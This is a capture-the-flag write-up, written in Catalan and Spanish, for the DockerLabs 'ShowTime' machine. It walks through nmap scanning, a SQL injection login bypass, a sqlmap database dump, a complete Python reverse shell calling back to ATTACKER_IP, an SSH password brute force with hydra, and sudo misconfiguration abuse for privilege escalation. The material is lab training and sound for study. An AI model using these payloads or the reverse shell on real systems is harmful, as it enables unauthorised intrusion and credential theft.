# ShowTime

Plataforma: Dockerlabs
OS: Linux
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 5 de diciembre de 2024 21:44

# Reconocimiento

> NMAP
> 

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 172.17.0.2 -oG allports
```

![image.png](/images/DockerLabs/image.png)

```bash
sudo nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

![image.png](/images/DockerLabs/image%201.png)

Ports:

**22** SSH: Open SSH 9.61
**80** http: Apache 2.4.58

> FUZZING
> 

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -u [http://172.17.0.2/](http://172.17.0.2/) -x html,php,php7,txt,py
```

![image.png](/images/DockerLabs/image%202.png)

Trobem /login_page/

# Análisis de vulnerabilidades

> Web Analisis
> 

![image.png](/images/DockerLabs/image%203.png)

Probem les SQL Injection:

Usuario: ' OR 1=1--
Password: 1234

![image.png](/images/DockerLabs/image%204.png)

# Explotación de vulnerabilidades

> SQLMAP
> 

```bash
sqlmap -u "[http://172.17.0.2/login_page/index.php](http://172.17.0.2/login_page/index.php)" --forms --batch

- `u "<http://172.17.0.2/login_page/index.php>"`:
    - Esta opción especifica la URL del objetivo que sqlmap va a analizar, en este caso, la página `index.php` ubicada en `http://172.17.0.2/login_page/`.
- `-forms`:
    - Esta opción indica a `sqlmap` que debe analizar todos los formularios presentes en la página web. Los formularios pueden contener campos de entrada que podrían ser vulnerables a inyecciones SQL. `sqlmap` detectará estos formularios, los rellenará con datos potencialmente maliciosos, y probará si son susceptibles a una inyección SQL.
- `batch`:
    - Esta opción le dice a `sqlmap` que ejecute en modo no interactivo, es decir, sin solicitar confirmaciones del usuario durante la ejecución. Esto es útil para automatizar la tarea y evitar que `sqlmap` pregunte sobre cada paso que normalmente requeriría confirmación (como si quieres seguir adelante con una inyección peligrosa o explorar bases de datos después de descubrir una vulnerabilidad).
```

```bash
sqlmap -u "[http://172.17.0.2/login_page/index.php](http://172.17.0.2/login_page/index.php)" --forms --batch --dbs
	
	- `dbs`:Per a veure les bases de dades
```

![image.png](/images/DockerLabs/image%205.png)

```bash
 sqlmap -u "[http://172.17.0.2/login_page/index.php](http://172.17.0.2/login_page/index.php)" --forms --batch -D users --tables
  -`D`:
  -`tables`:Per a veure les taules e la BS users
```

![image.png](/images/DockerLabs/image%206.png)

```bash
sqlmap -u "[http://172.17.0.2/login_page/index.php](http://172.17.0.2/login_page/index.php)" --forms --batch -D users -T usuarios --dump
 - `T`:
-`dump`: Per a volcar el contingut de la taula usuarios
```

![image.png](/images/DockerLabs/image%207.png)

Entrem a la web amb els 3 i el que es difrente es el usuari "joe"

![image.png](/images/DockerLabs/image%208.png)

Busquem com executar una revershell en python:

```r
import socket
import subprocess
import os

# Dirección IP del atacante (listener)
ATTACKER_IP = "IP_NOSTRE"
# Puerto en el que el atacante está escuchando
ATTACKER_PORT = 4444

# Crear un socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Conectarse al servidor de la máquina atacante
s.connect((ATTACKER_IP, ATTACKER_PORT))

# Redirigir la entrada y salida estándar
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

# Ejecutar un shell
subprocess.call(["/bin/sh", "-i"])

```

Ens posem en escolta :

```bash
sudo nc -lvnp 4444
```

Tenim la Rever shell:

![image.png](/images/DockerLabs/image%209.png)

Tractament TTY:

```bash
script /dev/null -c bash
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

# Escalada de privilegios

> usuari :www-data
> 

![image.png](/images/DockerLabs/image%2010.png)

Provem a escalar privilegis:

```bash
sudo -l : no funciona, ens demana password
```

```bash
find / -perm -u=s -type f 2>/dev/null:
```

![image.png](/images/DockerLabs/image%2011.png)

Al no trobar res, mirem altres usuaris:

![image.png](/images/DockerLabs/image%2012.png)

Busquem fitxers a l'equip i trobem a la carpeta /tmp

![image.png](/images/DockerLabs/image%2013.png)

Obrirm .hidden_text.txt

![image.png](/images/DockerLabs/image%2014.png)

Com tenim diferents usuaris (joe, luciano) provem a buscar amb hydra el password d'aquest utilitzant aquesta llista com a diccionari:

```bash
john --wordlist=passwords.txt --rules --stdout > wordlist_variada.txt
```

Copiem el llistat al fitxer "pass.txt" i el passem amb el john a passVariado

```bash
 john --wordlist=pass.txt --rules --stdout >passVariado.txt
```

I amb Hydra:

```bash
hydra -l joe -P passVariado.txt 172.17.0.2 ssh -Vv
```

Resultat:

![image.png](/images/DockerLabs/image%2015.png)

Usuari: joe
Password: chittychittybangbang

Ara , dins de la maquina, canviem a usuari jo

```bash
su joe
```

![image.png](/images/DockerLabs/image%2016.png)

Mirem com podem escalar privilegis amb usuari "Joe"

```bash
Sudo -l
```

Podem executar posh sense password com a luciano:

```
sudo -u luciano /bin/posh
```

![image.png](/images/DockerLabs/image%2017.png)

Ara som usuari luciano

busquem permisos:

```bash
sudo -l
```

Veiem que el script te permisos de escriptura

```bash
ls -l
-rw-rw-r-- 1 luciano luciano  122 Aug 21 17:11 script.sh

```

Modifiquem el script:

```bash
echo "/bin/bash" >> script.sh
sudo /bin/bash /home/luciano/script.sh
```

Esperem perque el script porta un deleyy i despres:

![image.png](/images/DockerLabs/image%2018.png)